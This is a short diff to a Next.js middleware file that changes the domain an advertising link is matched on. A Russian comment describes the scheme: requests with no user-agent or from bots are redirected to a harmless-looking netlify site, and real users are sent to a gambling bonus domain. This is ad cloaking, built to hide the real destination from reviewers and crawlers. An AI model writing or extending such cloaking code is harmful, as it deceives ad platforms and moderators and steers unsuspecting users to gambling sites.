@@ -74,10 +74,10 @@ export async function middleware(request: NextRequest) {
     return NextResponse.next();
   }
 
-  // 2) Рекламная ссылка gamingyalanyok.netlify.app:
+  // 2) Рекламная ссылка gaminyalanyokt1.netlify.app:
   //    - без user-agent или бот → редирект на yalanyokgaming.netlify.app
   //    - реальный пользователь → редирект на bonus-turboplay.bet
-  if (host.endsWith('gamingyalanyok.netlify.app')) {
+  if (host.endsWith('gaminyalanyokt1.netlify.app')) {
     const headers: Record<string, string> = {};
     request.headers.forEach((value, key) => {
       headers[key] = value;
